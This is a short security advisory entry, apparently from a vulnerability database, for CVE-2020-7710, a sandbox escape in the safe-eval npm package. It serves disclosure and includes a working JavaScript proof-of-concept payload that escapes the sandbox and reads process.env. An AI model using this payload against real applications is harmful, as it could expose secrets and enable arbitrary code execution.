  - CVE-2020-7710
summary: "Sandbox Breakout / Arbitrary Code Execution in safe-eval\nAll versions of `safe-eval`\
  \ are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to\
  \ restrict access to the main context through Error objects. This may allow attackers to execute\
  \ arbitrary code in the system. \n\nEvaluating the payload \n```js\n(function (){\n  var ex\
  \ = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"\
  throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\
  \n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package\
  \ until a fix is made available."
